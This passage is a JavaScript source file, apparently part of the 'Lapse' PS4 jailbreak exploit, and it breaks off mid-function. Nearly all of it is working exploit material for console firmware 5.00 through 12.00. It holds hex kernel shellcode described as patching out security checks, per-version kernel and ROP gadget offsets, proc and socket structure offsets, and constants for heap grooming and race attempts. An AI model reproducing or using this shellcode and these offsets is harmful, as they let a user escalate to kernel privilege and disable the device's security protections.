/***** kernel_offset.js *****/

// PS4 Kernel Offsets for Lapse exploit
// Source: https://github.com/Helloyunho/yarpe/blob/main/payloads/lapse.py

// Kernel patch shellcode (hex strings) - patches security checks in kernel
// These are executed via kexec after jailbreak to enable full functionality
const kpatch_shellcode = {
    "5.00": "B9820000C00F3248C1E22089C04809C2488D8A40FEFFFF0F20C04825FFFFFEFF0F22C0B8EB000000BEEB000000BFEB04000041B890E9FFFF4881C2A0320100C681BD0A0000EBC6816DA31E00EBC681B1A31E00EBC6812DA41E00EBC68171A41E00EBC6810DA61E00EBC6813DAA1E00EBC681FDAA1E00EBC7819304000000000000C681C5040000EB668981BC0400006689B1B8040000C6817D4A0500EB6689B9F83A1A00664489812A7E2300C78150232B004831C0C3C68110D5130037C68113D5130037C78120C807010200000048899128C80701C7814CC80701010000000F20C0480D000001000F22C031C0C3",
    "5.03": "B9820000C00F3248C1E22089C04809C2488D8A40FEFFFF0F20C04825FFFFFEFF0F22C0B8EB000000BEEB000000BFEB04000041B890E9FFFF4881C2A0320100C681BD0A0000EBC6817DA41E00EBC681C1A41E00EBC6813DA51E00EBC68181A51E00EBC6811DA71E00EBC6814DAB1E00EBC6810DAC1E00EBC7819304000000000000C681C5040000EB668981BC0400006689B1B8040000C6817D4A0500EB6689B9083C1A00664489813A7F2300C78120262B004831C0C3C68120D6130037C68123D6130037C78120C807010200000048899128C80701C7814CC80701010000000F20C0480D000001000F22C031C0C3",
    "5.50": "B9820000C00F3248C1E22089C04809C2488D8A40FEFFFF0F20C04825FFFFFEFF0F22C0B890E9FFFFBEEB000000BFEB00000041B8EB04000041B990E9FFFF4881C2CCAD0000C681ED0A0000EBC6810D594000EBC68151594000EBC681CD594000EBC681115A4000EBC681BD5B4000EBC6816D604000EBC6813D614000EBC7819004000000000000668981C60400006689B1BD0400006689B9B9040000C681CD070100EB6644898198EE0200664489890A390600C781300140004831C0C3C681D9253C0037C681DC253C0037C781D05E110102000000488991D85E1101C781FC5E1101010000000F20C0480D000001000F22C031C0C3",
    "5.53": "B9820000C00F3248C1E22089C04809C2488D8A40FEFFFF0F20C04825FFFFFEFF0F22C0B890E9FFFFBEEB000000BFEB00000041B8EB04000041B990E9FFFF4881C2CCAD0000C681ED0A0000EBC6810D584000EBC68151584000EBC681CD584000EBC68111594000EBC681BD5A4000EBC6816D5F4000EBC6813D604000EBC7819004000000000000668981C60400006689B1BD0400006689B9B9040000C681CD070100EB6644898198EE0200664489890A390600C781300040004831C0C3C681D9243C0037C681DC243C0037C781D05E110102000000488991D85E1101C781FC5E1101010000000F20C0480D000001000F22C031C0C3",
    "5.55": "B9820000C00F3248C1E22089C04809C2488D8A40FEFFFF0F20C04825FFFFFEFF0F22C0B890E9FFFFBEEB000000BFEB00000041B8EB04000041B990E9FFFF4881C2CCAD0000C681ED0A0000EBC681CD5B4000EBC681115C4000EBC6818D5C4000EBC681D15C4000EBC6817D5E4000EBC6812D634000EBC681FD634000EBC7819004000000000000668981C60400006689B1BD0400006689B9B9040000C681CD070100EB6644898198EE0200664489890A390600C781F00340004831C0C3C68199283C0037C6819C283C0037C781D0AE110102000000488991D8AE1101C781FCAE1101010000000F20C0480D000001000F22C031C0C3",
    "5.56": "B9820000C00F3248C1E22089C04809C2488D8A40FEFFFF0F20C04825FFFFFEFF0F22C0B890E9FFFFBEEB000000BFEB00000041B8EB04000041B990E9FFFF4881C209EF0300C681DD0A0000EBC6814D461100EBC68191461100EBC6810D471100EBC68151471100EBC681FD481100EBC681AD4D1100EBC6817D4E1100EBC7819004000000000000668981C60400006689B1BD0400006689B9B9040000C681ED900200EB6644898158223500664489895AF62700C78110A801004831C0C3C6816D02240037C6817002240037C78150B711010200000048899158B71101C7817CB71101010000000F20C0480D000001000F22C031C0C3",
    "6.00": "B9820000C00F3248C1E22089C04809C2488D8A40FEFFFF0F20C04825FFFFFEFF0F22C0B890E9FFFFBEEB000000BFEB00000041B8EB04000041B990E9FFFF4881C209EF0300C681DD0A0000EBC6814D461100EBC68191461100EBC6810D471100EBC68151471100EBC681FD481100EBC681AD4D1100EBC6817D4E1100EBC7819004000000000000668981C60400006689B1BD0400006689B9B9040000C681ED900200EB6644898158223500664489895AF62700C78110A801004831C0C3C6816D02240037C6817002240037C78150B711010200000048899158B71101C7817CB71101010000000F20C0480D000001000F22C031C0C3",
    "6.20": "B9820000C00F3248C1E22089C04809C2488D8A40FEFFFF0F20C04825FFFFFEFF0F22C0B890E9FFFFBEEB000000BFEB00000041B8EB04000041B990E9FFFF4881C2AEBC0200C681DD0A0000EBC6814D461100EBC68191461100EBC6810D471100EBC68151471100EBC681FD481100EBC681AD4D1100EBC6817D4E1100EBC7819004000000000000668981C60400006689B1BD0400006689B9B9040000C681ED900200EB6644898178223500664489897AF62700C78110A801004831C0C3C6816D02240037C6817002240037C78150F711010200000048899158F71101C7817CF71101010000000F20C0480D000001000F22C031C0C3",
    "6.50": "B9820000C00F3248C1E22089C04809C2488D8A40FEFFFF0F20C04825FFFFFEFF0F22C0B8EB000000BEEB000000BF90E9FFFF41B8EB0000006689810EC5630041B9EB00000041BAEB04000041BB90E9FFFFB890E9FFFF4881C24DA31500C681CD0A0000EBC6814D113C00EBC68191113C00EBC6810D123C00EBC68151123C00EBC681FD133C00EBC681AD183C00EBC6817D193C00EB6689B10FCE6300C78190040000000000006689B9C604000066448981BD04000066448989B9040000C68127BB1000EB66448991081A4500664489991E801D00668981AA851D00C781209F41004831C0C3C6817AB50A0037C6817DB50A0037C78110D211010200000048899118D21101C7813CD21101010000000F20C0480D000001000F22C031C0C3",
    "6.70": "B9820000C00F3248C1E22089C04809C2488D8A40FEFFFF0F20C04825FFFFFEFF0F22C0B8EB000000BEEB000000BF90E9FFFF41B8EB000000668981CEC8630041B9EB00000041BAEB04000041BB90E9FFFFB890E9FFFF4881C25DCF0900C681CD0A0000EBC681FD143C00EBC68141153C00EBC681BD153C00EBC68101163C00EBC681AD173C00EBC6815D1C3C00EBC6812D1D3C00EB6689B1CFD16300C78190040000000000006689B9C604000066448981BD04000066448989B9040000C681D7BE1000EB66448991B81D450066448999CE831D006689815A891D00C781D0A241004831C0C3C6817AB50A0037C6817DB50A0037C78110E211010200000048899118E21101C7813CE21101010000000F20C0480D000001000F22C031C0C3",
    "7.00": "B9820000C00F3248C1E22089C04809C2488D8A40FEFFFF0F20C04825FFFFFEFF0F22C0B8EB000000BEEB000000BF90E9FFFF41B8EB000000668981CEAC630041B9EB00000041BAEB04000041BB90E9FFFFB890E9FFFF4881C2D2AF0600C681CD0A0000EBC6818DEF0200EBC681D1EF0200EBC6814DF00200EBC68191F00200EBC6813DF20200EBC681EDF60200EBC681BDF70200EB6689B1EFB56300C78190040000000000006689B9C604000066448981BD04000066448989B9040000C681777B0800EB66448991084C260066448999C14E09006689817B540900C781202C2F004831C0C3C68136231D0037C68139231D0037C781705812010200000048899178581201C7819C581201010000000F20C0480D000001000F22C031C0C3",
    "7.50": "B9820000C00F3248C1E22089C04809C2488D8A40FEFFFF0F20C04825FFFFFEFF0F22C0B8EB000000BEEB000000BF90E9FFFF41B8EB0000006689819473630041B9EB00000041BAEB04000041BB90E9FFFFB890E9FFFF4881C282F60100C681DD0A0000EBC6814DF72800EBC68191F72800EBC6810DF82800EBC68151F82800EBC681FDF92800EBC681ADFE2800EBC6817DFF2800EB6689B1CF7C6300C78190040000000000006689B9C604000066448981BD04000066448989B9040000C68127A33700EB66448991C814300066448999041E4500668981C4234500C781309A02004831C0C3C6817DB10D0037C68180B10D0037C781502512010200000048899158251201C7817C251201010000000F20C0480D000001000F22C031C0C3",
    "8.00": "B9820000C00F3248C1E22089C04809C2488D8A40FEFFFF0F20C04825FFFFFEFF0F22C0B8EB000000BEEB000000BFEB00000041B8EB00000041B9EB04000041BA90E9FFFF4881C2DC600E0066898154D26200C681CD0A0000EBC6810DE12500EBC68151E12500EBC681CDE12500EBC68111E22500EBC681BDE32500EBC6816DE82500EBC6813DE92500EB6689B13FDB6200C7819004000000000000C681C2040000EB6689B9B904000066448981B5040000C68196D63400EB664489898BC63E0066448991848D3100C6813F953100EBC781C05109004831C0C3C6813AD00F0037C6813DD00F0037C781E0C60F0102000000488991E8C60F01C7810CC70F01010000000F20C0480D000001000F22C031C0C3",
    "8.50": "B9820000C00F3248C1E22089C04809C2488D8A40FEFFFF0F20C04825FFFFFEFF0F22C0B8EB000000BEEB000000BFEB00000041B8EB00000041B9EB04000041BA90E9FFFF4881C24D7F0C0066898174466200C681CD0A0000EBC6813D403A00EBC68181403A00EBC681FD403A00EBC68141413A00EBC681ED423A00EBC6819D473A00EBC6816D483A00EB6689B15F4F6200C7819004000000000000C681C2040000EB6689B9B904000066448981B5040000C681D6F32200EB66448989DBD614006644899174740100C6812F7C0100EBC78140D03A004831C0C3C681EA26080037C681ED26080037C781D0C70F0102000000488991D8C70F01C781FCC70F01010000000F20C0480D000001000F22C031C0C3",
    "9.00": "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb000000beeb000000bfeb00000041b8eb00000041b9eb04000041ba90e9ffff4881c2edc5040066898174686200c681cd0a0000ebc681fd132700ebc68141142700ebc681bd142700ebc68101152700ebc681ad162700ebc6815d1b2700ebc6812d1c2700eb6689b15f716200c7819004000000000000c681c2040000eb6689b9b904000066448981b5040000c681061a0000eb664489898b0b080066448991c4ae2300c6817fb62300ebc781401b22004831c0c3c6812a63160037c6812d63160037c781200510010200000048899128051001c7814c051001010000000f20c0480d000001000f22c031c0c3",
    "9.03": "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb000000beeb000000bfeb00000041b8eb00000041b9eb04000041ba90e9ffff4881c29b30050066898134486200c681cd0a0000ebc6817d102700ebc681c1102700ebc6813d112700ebc68181112700ebc6812d132700ebc681dd172700ebc681ad182700eb6689b11f516200c7819004000000000000c681c2040000eb6689b9b904000066448981b5040000c681061a0000eb664489898b0b08006644899194ab2300c6814fb32300ebc781101822004831c0c3c681da62160037c681dd62160037c78120c50f010200000048899128c50f01c7814cc50f01010000000f20c0480d000001000f22c031c0c3",
    "9.50": "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb000000beeb000000bfeb00000041b8eb00000041b9eb04000041ba90e9ffff4881c2ad580100668981e44a6200c681cd0a0000ebc6810d1c2000ebc681511c2000ebc681cd1c2000ebc681111d2000ebc681bd1e2000ebc6816d232000ebc6813d242000eb6689b1cf536200c7819004000000000000c681c2040000eb6689b9b904000066448981b5040000c68136a51f00eb664489893b6d19006644899124f71900c681dffe1900ebc781601901004831c0c3c6817a2d120037c6817d2d120037c78100950f010200000048899108950f01c7812c950f01010000000f20c0480d000001000f22c031c0c3",
    "10.00": "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb000000beeb000000bfeb00000041b8eb00000041b9eb04000041ba90e9ffff4881c2f166000066898164e86100c681cd0a0000ebc6816d2c4700ebc681b12c4700ebc6812d2d4700ebc681712d4700ebc6811d2f4700ebc681cd334700ebc6819d344700eb6689b14ff16100c7819004000000000000c681c2040000eb6689b9b904000066448981b5040000c68156772600eb664489897b20390066448991a4fa1800c6815f021900ebc78140ea1b004831c0c3c6819ad50e0037c6819dd50e0037c781a02f100102000000488991a82f1001c781cc2f1001010000000f20c0480d000001000f22c031c0c3",
    "10.50": "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb040000beeb040000bf90e9ffff41b8eb00000066898113302100b8eb04000041b9eb00000041baeb000000668981ecb2470041bbeb000000b890e9ffff4881c22d0c05006689b1233021006689b94330210066448981b47d6200c681cd0a0000ebc681bd720d00ebc68101730d00ebc6817d730d00ebc681c1730d00ebc6816d750d00ebc6811d7a0d00ebc681ed7a0d00eb664489899f866200c7819004000000000000c681c2040000eb66448991b904000066448999b5040000c681c6c10800eb668981d42a2100c7818830210090e93c01c78160ab2d004831c0c3c6812ac4190037c6812dc4190037c781d02b100102000000488991d82b1001c781fc2b1001010000000f20c0480d000001000f22c031c0c3",
    "11.00": "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb040000beeb040000bf90e9ffff41b8eb000000668981334c1e00b8eb04000041b9eb00000041baeb000000668981ecc8350041bbeb000000b890e9ffff4881c2611807006689b1434c1e006689b9634c1e0066448981643f6200c681cd0a0000ebc6813ddd2d00ebc68181dd2d00ebc681fddd2d00ebc68141de2d00ebc681eddf2d00ebc6819de42d00ebc6816de52d00eb664489894f486200c7819004000000000000c681c2040000eb66448991b904000066448999b5040000c68126154300eb668981f4461e00c781a84c1e0090e93c01c781e08c08004831c0c3c6816a62150037c6816d62150037c781701910010200000048899178191001c7819c191001010000000f20c0480d000001000f22c031c0c3",
    "11.02": "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb040000beeb040000bf90e9ffff41b8eb000000668981534c1e00b8eb04000041b9eb00000041baeb0000006689810cc9350041bbeb000000b890e9ffff4881c2611807006689b1634c1e006689b9834c1e0066448981043f6200c681cd0a0000ebc6815ddd2d00ebc681a1dd2d00ebc6811dde2d00ebc68161de2d00ebc6810de02d00ebc681bde42d00ebc6818de52d00eb66448989ef476200c7819004000000000000c681c2040000eb66448991b904000066448999b5040000c681b6144300eb66898114471e00c781c84c1e0090e93c01c781e08c08004831c0c3c6818a62150037c6818d62150037c781701910010200000048899178191001c7819c191001010000000f20c0480d000001000f22c031c0c3",
    "11.50": "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb040000beeb040000bf90e9ffff41b8eb000000668981a3761b00b8eb04000041b9eb00000041baeb000000668981acbe2f0041bbeb000000b890e9ffff4881c2150307006689b1b3761b006689b9d3761b0066448981b4786200c681cd0a0000ebc681edd22b00ebc68131d32b00ebc681add32b00ebc681f1d32b00ebc6819dd52b00ebc6814dda2b00ebc6811ddb2b00eb664489899f816200c7819004000000000000c681c2040000eb66448991b904000066448999b5040000c681a6123900eb66898164711b00c78118771b0090e93c01c78120d63b004831c0c3c6813aa61f0037c6813da61f0037c781802d100102000000488991882d1001c781ac2d1001010000000f20c0480d000001000f22c031c0c3",
    "12.00": "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb040000beeb040000bf90e9ffff41b8eb000000668981a3761b00b8eb04000041b9eb00000041baeb000000668981ecc02f0041bbeb000000b890e9ffff4881c2717904006689b1b3761b006689b9d3761b0066448981f47a6200c681cd0a0000ebc681cdd32b00ebc68111d42b00ebc6818dd42b00ebc681d1d42b00ebc6817dd62b00ebc6812ddb2b00ebc681fddb2b00eb66448989df836200c7819004000000000000c681c2040000eb66448991b904000066448999b5040000c681e6143900eb66898164711b00c78118771b0090e93c01c78160d83b004831c0c3c6811aa71f0037c6811da71f0037c781802d100102000000488991882d1001c781ac2d1001010000000f20c0480d000001000f22c031c0c3",
};

// Mmap RWX patch offsets per firmware (for verification)
// These are the offsets where 0x33 is patched to 0x37
const kpatch_mmap_offsets = {
    // TODO: missing 5.00 to 8.50
    "5.55": [0x3c2899, 0x3c289c],   // TODO: verify
    "5.56": [0x24026d, 0x240270],   // TODO: verify
    "6.00": [0x24026d, 0x240270],   // TODO: verify
    "6.20": [0x24026d, 0x240270],   // TODO: verify
    "6.50": [0xab57a, 0xab57d],     // TODO: verify
    "6.70": [0xab57a, 0xab57d],     // TODO: verify
    "7.00": [0x1d2336, 0x1d2339],   // TODO: verify
    "7.50": [0xdb17d, 0xdb180],     // TODO: verify
    "8.00": [0xfd03a, 0xfd03d],     // TODO: verify
    "8.50": [0x826ea, 0x826ed],     // TODO: verify
    "9.00": [0x16632a, 0x16632d],   // TODO: verify
    "9.03": [0x1662da, 0x1662dd],   // TODO: verify
    "9.50": [0x122d7a, 0x122d7d],   // TODO: verify
    "10.00": [0xed59a, 0xed59d],    // TODO: verify
    "10.50": [0x19c42a, 0x19c42d],  // TODO: verify
    "11.00": [0x15626a, 0x15626d],
    "11.02": [0x15628a, 0x15628d],
    "11.50": [0x1fa63a, 0x1fa63d],
    "12.00": [0x1fa71a, 0x1fa71d],
};

const shellcode_fw_map = {
    "5.00": "5.00",
    "5.01": "5.00",
    "5.03": "5.03",
    "5.05": "5.03",
    "5.07": "5.03",
    "5.50": "5.50",
    "5.53": "5.53",
    "5.55": "5.55",
    "5.56": "5.56",
    "6.00": "6.00",
    "6.02": "6.00",
    "6.20": "6.20",
    "6.50": "6.50",
    "6.51": "6.50",
    "6.70": "6.70",
    "6.71": "6.70",
    "6.72": "6.70",
    "7.00": "7.00",
    "7.01": "7.00",
    "7.02": "7.00",
    "7.50": "7.50",
    "7.51": "7.50",
    "7.55": "7.50",
    "8.00": "8.00",
    "8.01": "8.00",
    "8.03": "8.00",
    "8.50": "8.50",
    "8.52": "8.50",
    "9.00": "9.00",
    "9.03": "9.03",
    "9.04": "9.03",
    "9.50": "9.50",
    "9.51": "9.50",
    "9.60": "9.50",
    "10.00": "10.00",
    "10.01": "10.00",
    "10.50": "10.50",
    "10.70": "10.50",
    "10.71": "10.50",
    "11.00": "11.00",
    "11.02": "11.02",
    "11.50": "11.50",
    "11.52": "11.50",
    "12.00": "12.00",
    "12.02": "12.00"
}

function get_mmap_patch_offsets(fw_version) {
    // Normalize version
    var lookup = fw_version;
    if (fw_version === "9.04") lookup = "9.03";
    else if (fw_version === "9.51" || fw_version === "9.60") lookup = "9.50";
    else if (fw_version === "10.01") lookup = "10.00";
    else if (fw_version === "10.70" || fw_version === "10.71") lookup = "10.50";
    else if (fw_version === "11.52") lookup = "11.50";
    else if (fw_version === "12.02") lookup = "12.00";

    return kpatch_mmap_offsets[lookup] || null;
}

// Helper to convert hex string to byte array
function hexToBytes(hex) {
    const bytes = [];
    for (var i = 0; i < hex.length; i += 2) {
        bytes.push(parseInt(hex.substr(i, 2), 16));
    }
    return bytes;
}

// Get kernel patch shellcode for firmware version
function get_kpatch_shellcode(fw_version) {
    const hex = kpatch_shellcode[shellcode_fw_map[fw_version]];
    if (!hex) {
        return null;
    }
    return hexToBytes(hex);
}

// Firmware-specific offsets for PS4

offset_ps4_5_00 = {             // AND 5.01
    EVF_OFFSET: 0X7B3ED4,
    PRISON0: 0X10986A0,
    ROOTVNODE: 0X22C19F0,
    SYSENT_661: 0X1084200,
    JMP_RSI_GADGET: 0X13460
};

offset_ps4_5_03 = {
    EVF_OFFSET: 0X7B42E4,
    PRISON0: 0X10986A0,
    ROOTVNODE: 0X22C1A70,
    SYSENT_661: 0X1084200,
    JMP_RSI_GADGET: 0X13460
};

offset_ps4_5_05 = {             // AND 5.07
    EVF_OFFSET: 0X7B42A4,
    PRISON0: 0X10986A0,
    ROOTVNODE: 0X22C1A70,
    SYSENT_661: 0X1084200,
    JMP_RSI_GADGET: 0X13460
};

offset_ps4_5_50 = {
    EVF_OFFSET: 0X80EF12,
    PRISON0: 0X1134180,
    ROOTVNODE: 0X22EF570,
    SYSENT_661: 0X111D8B0,
    JMP_RSI_GADGET: 0XAF8C
};

offset_ps4_5_53 = {
    EVF_OFFSET: 0X80EDE2,
    PRISON0: 0X1134180,
    ROOTVNODE: 0X22EF570,
    SYSENT_661: 0X111D8B0,
    JMP_RSI_GADGET: 0XAF8C
};

offset_ps4_5_55 = {
    EVF_OFFSET: 0X80F482,
    PRISON0: 0X1139180,
    ROOTVNODE: 0X22F3570,
    SYSENT_661: 0X11228B0,
    JMP_RSI_GADGET: 0XAF8C
};

offset_ps4_5_56 = {
    EVF_OFFSET: 0X7C8971,
    PRISON0: 0X1139180,
    ROOTVNODE: 0X22F3570,
    SYSENT_661: 0X1123130,
    JMP_RSI_GADGET: 0X3F0C9
};

offset_ps4_6_00 = {             // AND 6.02
    EVF_OFFSET: 0X7C8971,
    PRISON0: 0X1139458,
    ROOTVNODE: 0X21BFAC0,
    SYSENT_661: 0X1123130,
    JMP_RSI_GADGET: 0X3F0C9
};

offset_ps4_6_20 = {
    EVF_OFFSET: 0X7C8E31,
    PRISON0: 0X113D458,
    ROOTVNODE: 0X21C3AC0,
    SYSENT_661: 0X1127130,
    JMP_RSI_GADGET: 0X2BE6E
};

offset_ps4_6_50 = {
    EVF_OFFSET: 0X7C6019,
    PRISON0: 0X113D4F8,
    ROOTVNODE: 0X2300320,
    SYSENT_661: 0X1124BF0,
    JMP_RSI_GADGET: 0X15A50D
};

offset_ps4_6_51 = {
    EVF_OFFSET: 0X7C6099,
    PRISON0: 0X113D4F8,
    ROOTVNODE: 0X2300320,
    SYSENT_661: 0X1124BF0,
    JMP_RSI_GADGET: 0X15A50D
};

offset_ps4_6_70 = {             // AND 6.71, 6.72
    EVF_OFFSET: 0X7C7829,
    PRISON0: 0X113E518,
    ROOTVNODE: 0X2300320,
    SYSENT_661: 0X1125BF0,
    JMP_RSI_GADGET: 0X9D11D
};

offset_ps4_7_00 = {             // AND 7.01, 7.02
    EVF_OFFSET: 0X7F92CB,
    PRISON0: 0X113E398,
    ROOTVNODE: 0X22C5750,
    SYSENT_661: 0X112D250,
    JMP_RSI_GADGET: 0X6B192
};

offset_ps4_7_50 = {
    EVF_OFFSET: 0X79A92E,
    PRISON0: 0X113B728,
    ROOTVNODE: 0X1B463E0,
    SYSENT_661: 0X1129F30,
    JMP_RSI_GADGET: 0X1F842
};

offset_ps4_7_51 = {             // AND 7.55
    EVF_OFFSET: 0X79A96E,
    PRISON0: 0X113B728,
    ROOTVNODE: 0X1B463E0,
    SYSENT_661: 0X1129F30,
    JMP_RSI_GADGET: 0X1F842
};

offset_ps4_8_00 = {             // AND 8.01, 8.02, 8.03
    EVF_OFFSET: 0X7EDCFF,
    PRISON0: 0X111A7D0,
    ROOTVNODE: 0X1B8C730,
    SYSENT_661: 0X11040C0,
    JMP_RSI_GADGET: 0XE629C
};

offset_ps4_8_50 = {             // AND 8.52
    EVF_OFFSET: 0X7DA91C,
    PRISON0: 0X111A8F0,
    ROOTVNODE: 0X1C66150,
    SYSENT_661: 0X11041B0,
    JMP_RSI_GADGET: 0XC810D
};

offset_ps4_9_00 = {
    EVF_OFFSET: 0x7F6F27,
    PRISON0: 0x111F870,
    ROOTVNODE: 0x21EFF20,
    TARGET_ID_OFFSET: 0x221688D,
    SYSENT_661: 0x1107F00,
    JMP_RSI_GADGET: 0x4C7AD,
};

offset_ps4_9_03 = {
    EVF_OFFSET: 0x7F4CE7,
    PRISON0: 0x111B840,
    ROOTVNODE: 0x21EBF20,
    TARGET_ID_OFFSET: 0x221288D,
    SYSENT_661: 0x1103F00,
    JMP_RSI_GADGET: 0x5325B,
};

offset_ps4_9_50 = {
    EVF_OFFSET: 0x769A88,
    PRISON0: 0x11137D0,
    ROOTVNODE: 0x21A6C30,
    TARGET_ID_OFFSET: 0x221A40D,
    SYSENT_661: 0x1100EE0,
    JMP_RSI_GADGET: 0x15A6D,
};

offset_ps4_10_00 = {
    EVF_OFFSET: 0x7B5133,
    PRISON0: 0x111B8B0,
    ROOTVNODE: 0x1B25BD0,
    TARGET_ID_OFFSET: 0x1B9E08D,
    SYSENT_661: 0x110A980,
    JMP_RSI_GADGET: 0x68B1,
};

offset_ps4_10_50 = {
    EVF_OFFSET: 0x7A7B14,
    PRISON0: 0x111B910,
    ROOTVNODE: 0x1BF81F0,
    TARGET_ID_OFFSET: 0x1BE460D,
    SYSENT_661: 0x110A5B0,
    JMP_RSI_GADGET: 0x50DED,
};

offset_ps4_11_00 = {
    EVF_OFFSET: 0x7FC26F,
    PRISON0: 0x111F830,
    ROOTVNODE: 0x2116640,
    TARGET_ID_OFFSET: 0x221C60D,
    SYSENT_661: 0x1109350,
    JMP_RSI_GADGET: 0x71A21,
};

offset_ps4_11_02 = {
    EVF_OFFSET: 0x7FC22F,
    PRISON0: 0x111F830,
    ROOTVNODE: 0x2116640,
    TARGET_ID_OFFSET: 0x221C60D,
    SYSENT_661: 0x1109350,
    JMP_RSI_GADGET: 0x71A21,
};

offset_ps4_11_50 = {
    EVF_OFFSET: 0x784318,
    PRISON0: 0x111FA18,
    ROOTVNODE: 0x2136E90,
    TARGET_ID_OFFSET: 0x21CC60D,
    SYSENT_661: 0x110A760,
    JMP_RSI_GADGET: 0x704D5,
};

offset_ps4_12_00 = {
    EVF_OFFSET: 0x784798,
    PRISON0: 0x111FA18,
    ROOTVNODE: 0x2136E90,
    TARGET_ID_OFFSET: 0x21CC60D,
    SYSENT_661: 0x110A760,
    JMP_RSI_GADGET: 0x47B31,
};

// Map firmware versions to offset objects
ps4_kernel_offset_list = {
    "5.00": offset_ps4_5_00,
    "5.01": offset_ps4_5_00,
    "5.03": offset_ps4_5_03,
    "5.05": offset_ps4_5_05,
    "5.07": offset_ps4_5_05,
    "5.50": offset_ps4_5_50,
    "5.53": offset_ps4_5_53,
    "5.55": offset_ps4_5_55,
    "5.56": offset_ps4_5_56,
    "6.00": offset_ps4_6_00,
    "6.02": offset_ps4_6_00,
    "6.20": offset_ps4_6_20,
    "6.50": offset_ps4_6_50,
    "6.51": offset_ps4_6_51,
    "6.70": offset_ps4_6_70,
    "6.71": offset_ps4_6_70,
    "6.72": offset_ps4_6_70,
    "7.00": offset_ps4_7_00,
    "7.01": offset_ps4_7_00,
    "7.02": offset_ps4_7_00,
    "7.50": offset_ps4_7_50,
    "7.51": offset_ps4_7_51,
    "7.55": offset_ps4_7_51,
    "8.00": offset_ps4_8_00,
    "8.01": offset_ps4_8_00,
    "8.02": offset_ps4_8_00,
    "8.03": offset_ps4_8_00,
    "8.50": offset_ps4_8_50,
    "8.52": offset_ps4_8_50,
    "9.00": offset_ps4_9_00,
    "9.03": offset_ps4_9_03,
    "9.04": offset_ps4_9_03,
    "9.50": offset_ps4_9_50,
    "9.51": offset_ps4_9_50,
    "9.60": offset_ps4_9_50,
    "10.00": offset_ps4_10_00,
    "10.01": offset_ps4_10_00,
    "10.50": offset_ps4_10_50,
    "10.70": offset_ps4_10_50,
    "10.71": offset_ps4_10_50,
    "11.00": offset_ps4_11_00,
    "11.02": offset_ps4_11_02,
    "11.50": offset_ps4_11_50,
    "11.52": offset_ps4_11_50,
    "12.00": offset_ps4_12_00,
    "12.02": offset_ps4_12_00,
};

kernel_offset = null;

function get_kernel_offset(FW_VERSION) {
    const fw_offsets = ps4_kernel_offset_list[FW_VERSION];

    if (!fw_offsets) {
        throw new Error("Unsupported PS4 firmware version: " + FW_VERSION);
    }

    kernel_offset = fw_offsets;

    // PS4-specific proc structure offsets
    kernel_offset.PROC_FD = 0x48;
    kernel_offset.PROC_PID = 0xB0;       // PS4 = 0xB0, PS5 = 0xBC
    kernel_offset.PROC_VM_SPACE = 0x200;
    kernel_offset.PROC_UCRED = 0x40;
    kernel_offset.PROC_COMM = -1;        // Found dynamically
    kernel_offset.PROC_SYSENT = -1;      // Found dynamically

    // filedesc - PS4 different from PS5
    kernel_offset.FILEDESC_OFILES = 0x0;  // PS4 = 0x0, PS5 = 0x8
    kernel_offset.SIZEOF_OFILES = 0x8;    // PS4 = 0x8, PS5 = 0x30

    // vmspace structure
    kernel_offset.VMSPACE_VM_PMAP = -1;

    // pmap structure
    kernel_offset.PMAP_CR3 = 0x28;

    // socket/net - PS4 specific
    kernel_offset.SO_PCB = 0x18;
    kernel_offset.INPCB_PKTOPTS = 0x118;  // PS4 = 0x118, PS5 = 0x120

    // pktopts structure - PS4 specific
    kernel_offset.IP6PO_TCLASS = 0xB0;    // PS4 = 0xB0, PS5 = 0xC0
    kernel_offset.IP6PO_RTHDR = 0x68;     // PS4 = 0x68, PS5 = 0x70

    return kernel_offset;
}

if (!String.prototype.padStart) {
    String.prototype.padStart = function padStart(targetLength, padString) {
        targetLength = targetLength >> 0; // truncate if number or convert non-number to 0
        padString = String(typeof padString !== 'undefined' ? padString : ' ');
        if (this.length > targetLength) {
            return String(this);
        } else {
            targetLength = targetLength - this.length;
            if (targetLength > padString.length) {
                padString += padString.repeat(targetLength / padString.length); // append to original to ensure we are longer than needed
            }
            return padString.slice(0, targetLength) + String(this);
        }
    };
}

FW_VERSION = "";

PAGE_SIZE = 0x4000;
PHYS_PAGE_SIZE = 0x1000;

LIBKERNEL_HANDLE = 0x2001;

MAIN_CORE = 4;
MAIN_RTPRIO = 0x100;
NUM_WORKERS = 2;
NUM_GROOMS = 0x200;
NUM_HANDLES = 0x100;
NUM_SDS = 64;
NUM_SDS_ALT = 48;
NUM_RACES = 100;
NUM_ALIAS = 100;
LEAK_LEN = 16;
NUM_LEAKS = 32;
NUM_CLOBBERS = 8;
MAX_AIO_IDS = 0x80;

AIO_CMD_READ = 1;
AIO_CMD_FLAG_MULTI = 0x1000;
AIO_CMD_MULTI_READ = 0x1001;
AIO_CMD_WRITE = 2;
AIO_STATE_COMPLETE = 3;
AIO_STATE_ABORTED = 4;

SCE_KERNEL_ERROR_ESRCH = 0x80020003;

RTP_LOOKUP = new BigInt(0);
RTP_SET = new BigInt(1);
PRI_REALTIME = new BigInt(2);

block_fd = 0xffffffff;
unblock_fd = 0xffffffff;
block_id = 0xffffffff;
groom_ids = null;
sds = null;
sds_alt = null;
prev_core = -1;
prev_rtprio = 0;
ready_signal = 0;
deletion_signal = 0;
pipe_buf = 0;

saved_fpu_ctrl = 0;
saved_mxcsr = 0;

function write8 (addr, val) {
    mem.view(addr).setUint8(0, val&0xFF, true)
}

function write16 (addr, val) {
    mem.view(addr).setUint16(0, val&0xFFFF, true)
}

function write32 (addr, val) {
    mem.view(addr).setUint32(0, val&0xFFFFFFFF, true)
}

function write64 (addr, val) {
    mem.view(addr).setBigInt(0, new BigInt(val), true)
}

function read8 (addr) {
    return mem.view(addr).getUint8(0, true)
}

function read16 (addr) {
